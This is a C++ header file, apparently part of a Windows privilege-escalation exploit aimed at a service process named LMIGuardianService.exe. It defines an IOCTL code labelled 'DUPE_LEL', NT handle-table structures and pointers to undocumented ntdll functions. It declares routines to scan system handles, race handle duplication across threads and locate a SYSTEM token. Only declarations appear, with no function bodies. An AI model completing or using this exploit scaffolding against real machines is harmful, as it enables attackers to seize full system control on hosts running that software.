#pragma once
#include <vector>
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <TlHelp32.h>
#pragma comment(lib, "ntdll")

#define OBJECT_TYPE_THREAD_TOKEN 5
#define OBJECT_TYPE_ALPC_PORT 0x33
#define THREAD_TOKEN_IMPERSONATE_PRIVILEGES 0xe
#define IOCTL_DUPE_LEL 0x9211001C
#define SystemHandleInformation 16
#define OBJECT_TYPE_PROCESS 7
#define ProcessHandleCount 0x14

typedef struct LMI_INFO {
	DWORD64 qwPid;
	DWORD64 reserved0;
	DWORD64 handleValue;
	DWORD64 reserved1;
} LMI_INFO, * PLMI_INFO;

typedef struct _DUPE_THREAD_INFO {
	HANDLE hDevice;
	BOOL Run;
}DUPE_THREAD_INFO, *PDUPE_THREAD_INFO;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

// handle table information
typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

static_assert(sizeof(LMI_INFO) == 0x20, "must be 0x20 bytes");

typedef NTSTATUS(WINAPI* lpNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* lpNtDuplicateObject)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
typedef NTSTATUS(WINAPI* lpNtQueryObject)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* lpNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

static lpNtQueryInformationProcess g_NtQueryInformationProcess = NULL;
static lpNtDuplicateObject g_NtDuplicateObject = NULL;
static lpNtQueryObject g_NtQueryObject = NULL;
static lpNtQuerySystemInformation g_NtQuerySystemInformation = NULL;
static HANDLE g_hCurrentProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
static const SIZE_T szNumThreads = 2;
static const char* g_strTargetProcName = "LMIGuardianService.exe";
static const SIZE_T g_strLenTargetProc = strlen(g_strTargetProcName);

std::vector<HANDLE> QuerySystemHandlesForObjectTypeAndAccess(DWORD dwObjectType, DWORD dwAccessMask);
VOID HandleSearchThread(LPVOID lpParam);
HANDLE FindSystemPidFirstToken();
NTSTATUS DupeThread(LPVOID lpParam);
HANDLE FindNextCreatedHandle();